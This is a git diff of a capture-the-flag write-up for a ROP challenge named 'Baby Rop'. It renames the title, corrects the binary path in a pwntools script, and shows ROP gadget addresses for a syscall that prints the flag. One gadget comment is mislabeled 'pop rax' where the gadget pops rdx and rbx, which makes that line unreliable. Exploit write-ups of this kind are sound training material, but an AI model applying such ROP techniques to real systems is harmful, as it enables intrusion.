@@ -1,4 +1,4 @@
-# Pwn - SimpleOverflow
+# Pwn - Baby Rop
 - Solved by: @Elma
 - Flag: **-UNKNOWN-**
 
@@ -124,7 +124,9 @@ p3 += p64(syscall)                      # write flag to stdout
 
 ```py
 from pwn import *
-context.binary = elf = ELF("./README.md")
+context.binary = elf = ELF("./baby_rop")
+
+p = process("./baby_rop")
 
 pop_rax = 0x449027 # pop rax ; ret
 pop_rdx_rbx = 0x47f0eb # pop rax ; ret
